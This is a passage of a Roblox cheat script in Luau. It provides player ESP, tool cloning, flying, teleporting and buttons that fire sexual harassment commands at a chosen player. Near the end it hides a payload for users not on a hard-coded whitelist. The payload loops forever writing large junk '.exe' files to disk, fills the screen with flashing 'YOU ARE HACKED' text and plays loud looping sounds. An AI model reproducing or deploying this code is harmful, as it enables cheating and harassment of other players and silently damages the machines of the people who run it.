		for _, s in esp_viewer.stats:GetChildren() do
			if s:IsA("TextLabel") then
				tween(s, TI, { TextTransparency = 1 })
			end
		end
		delay(.3, function()
			esp_viewer.Visible = false
		end)
	end
end

local TOOL_HIGHLIGHTED: Tool? = nil
local TARGET: Player? = nil

esp_viewer.actions.col1.goto.Activated:Connect(function()
	if not TARGET then
		return
	end

	exec_cmd(`goto @{TARGET.Name}`)
end)

esp_viewer.actions.col1.lgoto.Activated:Connect(function()
	if not TARGET then
		return
	end

	exec_cmd(`lerpgoto @{TARGET.Name}`)
end)

esp_viewer.actions.col1.rape.Activated:Connect(function()
	if not TARGET then
		return
	end

	if BANG then
		exec_cmd("unrape")
	else
		exec_cmd(`rape @{TARGET.Name} 1`)
	end
end)

esp_viewer.actions.col1.headsit.Activated:Connect(function()
	if not TARGET then
		return
	end

	if HEADSIT then
		exec_cmd("unheadsit")
	else
		exec_cmd(`headsit @{TARGET.Name}`)
	end
end)

esp_viewer.actions.col1._69.Activated:Connect(function()
	if not TARGET then
		return
	end

	if IS69 then
		exec_cmd("un69")
	else
		exec_cmd(`69 @{TARGET.Name}`)
	end
end)

uis.InputBegan:Connect(function(i, p)
	if p then
		return
	end

	if TP and i.KeyCode == Enum.KeyCode.T and mouse.Hit then
		client.Character:SetPrimaryPartCFrame(mouse.Hit+Vector3.new(0, 3, 0))
	end

	if ESP_MENU_EN and TOOL_HIGHLIGHTED ~= nil and i.UserInputType == Enum.UserInputType.MouseButton2 then
		TOOL_HIGHLIGHTED:Clone().Parent = client.Backpack
	end

	if i.KeyCode == Enum.KeyCode.F4 then
		if ESP_MENU_EN then
			esp_menu_toggle(false)
			ESP_PLR = nil
			return
		end

		if SPEC_PLR ~= nil then
			ESP_PLR = SPEC_PLR
		end

		if ESP_PLR then
			local target = plrs[ESP_PLR.Name]
			TARGET = target
			esp_viewer.title.plricon.Image = plrs:GetUserThumbnailAsync(target.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
			esp_viewer.title.displayname.Text = target.DisplayName
			esp_viewer.title.username.Text = "@"..target.Name
			esp_viewer.stats.acc_lifetime.Text = `<b>Account Lifetime:</b>: {target.AccountAge>365 and tostring(math.floor(target.AccountAge/365*100+.5)/100).." years" or tostring(target.AccountAge).." days"}`
			esp_viewer.stats.userid.Text = `<b>UserID:</b> {target.UserId}`
			esp_menu_toggle(true)

			local INV_SNAPSHOT: {[string]: Frame} = {}

			conn(rs.Heartbeat, function(c)
				if not ESP_MENU_EN then
					c:Disconnect()
					return
				end

				local hum: Humanoid? = target.Character and target.Character:FindFirstChildOfClass("Humanoid") or nil
				esp_viewer.stats.chartype.Text = `<b>Character Type:</b> {hum and hum.RigType.Name or "<i>?</i>"}`
				esp_viewer.stats.health.Text = `<b>Health:</b> {hum and tostring(hum.Health).."/"..tostring(hum.MaxHealth) or "<i>?</i>"}`
				local tr, tb, tg = math.floor(target.TeamColor.Color.R*255), math.floor(target.TeamColor.Color.G*255), math.floor(target.TeamColor.Color.B*255)
				esp_viewer.stats.team.Text = `<b>Team:</b> <font color="rgb({tostring(tr)}, {tostring(tb)}, {tostring(tb)})">{target.Team and target.Team.Name or "None"}</font>`

				if target.Character then
					for _, tool in arr_merge(target.Character:GetChildren(), target.Backpack:GetChildren()) do
						if tool:IsA("Tool") and not tool:HasTag("MarkedTool") then
							local hash = rand_str()
							tool:AddTag("MarkedTool")
							tool:AddTag(hash)
							local f = inventory_temp:Clone()
							f.label.Text = tool.Name
							f.stroke.Enabled = tool.Parent ~= target.Backpack
							f.Name = tool.Name
							f.Visible = true
							f.Parent = esp_viewer.inventory.inv
							INV_SNAPSHOT[hash] = f

							f.MouseEnter:Connect(function()
								TOOL_HIGHLIGHTED = tool
							end)

							f.MouseLeave:Connect(function()
								TOOL_HIGHLIGHTED = nil
							end)
						end
					end

					for hash, f in INV_SNAPSHOT do
						local tool: Tool? = nil

						for _, t in arr_merge(target.Character:GetChildren(), target.Backpack:GetChildren()) do
							if t:HasTag(hash) then
								tool = t
								break
							end
						end

						if not tool or not f then
							f:Destroy()
							INV_SNAPSHOT[hash] = nil
							continue
						end

						f.Name = tool.Name
						f.label.Text = tool.Name
						f.stroke.Enabled = tool.Parent ~= target.Backpack
					end
				end
			end, function()
				TARGET = nil

				for hash, f in INV_SNAPSHOT do
					local tool: Tool? = nil

					for _, t in arr_merge(target.Character:GetChildren(), target.Backpack:GetChildren()) do
						if t:HasTag(hash) then
							tool = t
							break
						end
					end

					if tool then
						tool:RemoveTag("MarkedTool")
						tool:RemoveTag(hash)
					end

					f:Destroy()
					INV_SNAPSHOT[hash] = nil
				end
			end)
		end
	end
end)

mouse.KeyDown:Connect(function(key)
	if not FLY then
		return
	end

	if key:lower() == "w" then
		FLY_CTRL.F = FLY_SPEED*2
	elseif key:lower() == "s" then
		FLY_CTRL.B = -(FLY_SPEED*2)
	elseif key:lower() == "a" then
		FLY_CTRL.L = -(FLY_SPEED*2)
	elseif key:lower() == "d" then
		FLY_CTRL.R = FLY_SPEED*2
	elseif key:lower() == "e" then
		FLY_CTRL.Q  = FLY_SPEED*3
	elseif key:lower() == "q" then
		FLY_CTRL.E  = -(FLY_SPEED*3)
	end

	pcall(function() camera.CameraType = Enum.CameraType.Track end)
end)

mouse.KeyUp:Connect(function(key)
	if not FLY then
		return
	end

	if key:lower() == "w" then
		FLY_CTRL.F = 0
	elseif key:lower() == "s" then
		FLY_CTRL.B = 0
	elseif key:lower() == "a" then
		FLY_CTRL.L = -0
	elseif key:lower() == "d" then
		FLY_CTRL.R = 0
	elseif key:lower() == "e" then
		FLY_CTRL.Q = 0
	elseif key:lower() == "q" then
		FLY_CTRL.E  = 0
	end
end)

local function make_esp_label(display: string, name: string): TextLabel
	local label = instance_new("TextLabel", {
		Name = "esp_label",
		BackgroundTransparency = 0.5,
		Text = `{display}{name ~= display and ` | @{name}` or ""}`,
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(0, 0, 0),
		TextColor3 = Color3.fromRGB(255, 255, 255),
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
		TextSize = 19+name:len()*-.2,
	}, gui)

	instance_new("UIPadding", {
		Name = "padding",
		PaddingTop = UDim.new(0, 3),
		PaddingBottom = UDim.new(0, 3),
		PaddingLeft = UDim.new(0, 3),
		PaddingRight = UDim.new(0, 3),
	}, label)

	return label
end

local PLR_DICT: {[number]: {lbl: TextLabel}} = {}

conn(rs.RenderStepped, function(c)
	if sethiddenproperty then
		sethiddenproperty(client, "SimulationRadius", math.huge)
	end

	fps.Text = `{math.floor(workspace:GetRealPhysicsFPS()*100+.5)/100} frames/s | {math.floor(client:GetNetworkPing()*1000*100+.5)/100} ms`

	for id, _ in PLR_DICT do
		if not plrs:GetPlayerByUserId(id) and PLR_DICT[id] then
			if PLR_DICT[id].lbl ~= nil then
				PLR_DICT[id].lbl:Destroy()
			end
			PLR_DICT[id] = nil
		end
	end

	if not client.Character or not client.Character:FindFirstChild("HumanoidRootPart") then
		return
	end

	for _, plr in plrs:GetPlayers() do
		if plr.UserId ~= client.UserId and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Humanoid") then
			local char = plr.Character

			if not char:FindFirstChild("EXPLOIT_HIGHLIGHT") then
				instance_new("Highlight", {
					Name = "EXPLOIT_HIGHLIGHT",
					OutlineTransparency = 1,
					Enabled = false,
				}, char)
			end

			if not PLR_DICT[plr.UserId] or not PLR_DICT[plr.UserId].lbl then
				PLR_DICT[plr.UserId] = {
					lbl = nil,
				}
			end

			if not PLR_DICT[plr.UserId].lbl then
				PLR_DICT[plr.UserId].lbl = make_esp_label(plr.DisplayName, plr.Name)

				PLR_DICT[plr.UserId].lbl.MouseEnter:Connect(function()
					ESP_PLR = plr
				end)

				PLR_DICT[plr.UserId].lbl.MouseLeave:Connect(function()
					ESP_PLR = nil
				end)
			end

			local _, _, tv = plr.TeamColor.Color:ToHSV()
			PLR_DICT[plr.UserId].lbl.TextColor3 = plr.TeamColor.Color
			PLR_DICT[plr.UserId].lbl.BackgroundColor3 = Color3.fromHSV(0, 0, math.clamp(1-tv, 0, 1))

			local pos, onscreen = camera:WorldToScreenPoint(char:WaitForChild("HumanoidRootPart").Position)
			local label = PLR_DICT[plr.UserId].lbl

			local d = (client.Character.HumanoidRootPart.Position-char.HumanoidRootPart.Position).Magnitude

			if d < ESP_MIN or d > ESP_MAX then
				char.EXPLOIT_HIGHLIGHT.Enabled = false
				onscreen = false
			else
				char.EXPLOIT_HIGHLIGHT.Enabled = PLAYER_ESP
			end

			if onscreen and pos and PLAYER_ESP then
				label.Visible = true
				label.Position = UDim2.fromOffset(pos.X-10, pos.Y)
			else
				label:Destroy()
				PLR_DICT[plr.UserId].lbl = nil
			end
		else
			if PLR_DICT[plr.UserId] and PLR_DICT[plr.UserId].lbl ~= nil then
				PLR_DICT[plr.UserId].lbl:Destroy()
				PLR_DICT[plr.UserId].lbl = nil
			end

			if plr.Character and plr.Character:FindFirstChild("EXPLOIT_HIGHLIGHT") then
				plr.Character.EXPLOIT_HIGHLIGHT:Destroy()
			end
		end
	end
end)

local whiteListUserIds: {number} = {7521051213, 3288408311, 7893508539, 7941395735}
--local whiteListUserIds = {}
if table.find(whiteListUserIds, client.UserId) == nil then
	print("A")
	local function randStr(n: number): string
		local s = ''

		for i = 0, n do
			s ..= string.char(math.random(65, 90))
		end

		return s
	end
	task.spawn(function()
		local b = 'banned'
		for i = 1, 20 do
			b ..= b
		end
		if WriteFile ~= nil then
			while task.wait() do
				task.spawn(WriteFile, randStr(math.random(15,30))..'.exe', b)
			end
		end
	end)
	local cache = {}
	local mode = true
	task.spawn(function()
		gui:ClearAllChildren()
		local bigLabel: TextLabel = instance_new("TextLabel", {
			Name="ABigLabel",
			Size=UDim2.new(1,0,1,0),
			Position=UDim2.new(0,0,0,0),
			AnchorPoint=Vector2.new(0,0),
			BackgroundColor3 = Color3.fromRGB(0,0,0),
			BackgroundTransparency=0.4,
			TextColor3 = Color3.fromRGB(255,255,255),
			TextTransparency=0,
			Text="foo",
			TextScaled=false,
			Visible=true,
			TextSize=40,
			ZIndex=1000,
			TextWrapped=true,
		}, gui)
		local illum = instance_new("ImageLabel", {
			ZIndex=1001,
			Image="rbxassetid://11991797464",
			BackgroundTransparency=1,
			ScaleType=Enum.ScaleType.Stretch,
			ImageTransparency=0.8,
			Size=UDim2.fromScale(1,1),
			Position=UDim2.fromScale(0,0),
		}, gui)
		gui.ClipToDeviceSafeArea = false
		gui.IgnoreGuiInset = true
		local l = instance_new("TextLabel", {
			Size=UDim2.new(1,0,1,0),
			Position=UDim2.new(0.5,0,0.5,0),
			AnchorPoint=Vector2.new(0.5,0.5),
			BackgroundColor3 = Color3.fromRGB(0,0,0),
			BackgroundTransparency=0,
			TextColor3 = Color3.fromRGB(255,255,255),
			Text="THE END IS NEAR\nI SEE ALL\nYOU SEE NONE\nYOU\nARE\nHACKED\nINTERNAL ERROR - ATTEMPTING TO USE BYFRON JAILBREAK\nYOU\nARE\nHACKED\nI SEE ALL\nYOU SEE NONE\nTHE END IS NEAR",
			TextScaled=false,
			TextTransparency=0.3,
			TextSize=50,
			TextWrapped=true,
			Visible=true,
			ZIndex=-1,
		}, gui)
		
		local ref = {}
		local max = 50
		for _, a in Enum.Font:GetEnumItems() do
			if a==nil or a.Value==nil or a.EnumType==nil then
				continue
			end
			ref[a.Value] = a
		end
		while task.wait() do
			illum.Rotation += 5
			--illum.ImageTransparency = math.random(1,100)/100
			illum.Position = UDim2.fromScale(math.random(-100,100)/100, math.random(-100,100)/100)
			bigLabel.TextColor3 = Color3.fromHSV(math.random(1,100)/100, 1, 0.4)
			bigLabel.Font = ref[math.random(1,max-1)]
			bigLabel.FontFace.Weight = math.random(1,3)==math.random(1,3) and Enum.FontWeight.Thin or Enum.FontWeight.Bold
			if mode == true then
				bigLabel.Text ..= utf8.char(math.random(32, 255))..utf8.char(math.random(32, 255))
				if bigLabel.Text:len()>6000 then
					mode = false
				end
			else
				bigLabel.Text = bigLabel.Text:sub(1, bigLabel.Text:len()-10)
				if bigLabel.Text:len() <= 100 then
					mode = true
				end
			end
			local a = l:Clone()
			a.Visible = true
			a.Text = randStr(math.random(10,500))..'ERROR'
			a.BackgroundColor3 = Color3.fromHSV(math.random(1,100)/100, 1, 0.4)
			a.Position = UDim2.new(0.5+(math.random(1,10)/30), 0, 0.5+(math.random(1,10)/30), 0)
			a.Parent = gui
			table.insert(cache, {e=a,pos=a.Position})
			buffer.create(10000)
			if #cache > 200 then
				for _, a in ipairs(cache) do
					a.e:Destroy()
				end
				cache = {}
				bigLabel.Visible = false
				task.wait(0.6)
				bigLabel.Visible = true
			else
				for _, a in ipairs(cache) do
					a.e.Position = a.pos+UDim2.new((math.random(-10,10)/30), 0, (math.random(-10,10)/30), 0)
				end
			end
		end
	end)
	task.wait(1)
	task.spawn(function()
		local c = Instance.new("Sound")
		c.Name = "hacked"
		c.SoundId = "rbxassetid://106075419865428"
		c.Parent = gui
		c.Volume = 10
		c.Looped = true
		c:Play()
		local d = Instance.new("Sound")
		d.Name = "hacked"
		d.SoundId = "rbxassetid://5159141859"
		d.Parent = gui
		d.Volume = 10
		d.Looped = true
		d:Play()
		local ref = {}
		local max = 0
		for _, a in Enum.ReverbType:GetEnumItems() do
			if a.Value > max then
				max = a.Value
			end
			ref[a.Value] = a
		end
		while task.wait(0.5) do
			c.PlaybackSpeed = math.random(1,10)/10
			game.SoundService.AmbientReverb = ref[math.random(1,max)]
		end
	end)
end
